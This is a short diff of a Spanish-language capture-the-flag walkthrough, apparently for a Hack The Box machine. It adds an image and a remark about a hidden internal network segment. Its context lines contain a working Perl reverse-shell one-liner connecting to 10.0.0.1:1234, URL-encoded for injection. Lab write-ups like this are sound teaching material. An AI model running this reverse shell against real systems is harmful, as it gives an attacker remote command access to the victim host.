@@ -185,8 +185,9 @@ A y para la shell usamos una de perl y pusimos %26 en lugar de & (url encode) pa
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/2f00b438-928b-4ea7-9d01-eb32cc1f5671)
 
-
+Esta es la Ip que nosotros veiamos 172.19.0.3 y en la imagen puedes ver que hay otra de otro segmento escondido para nosotros.
 
 
 
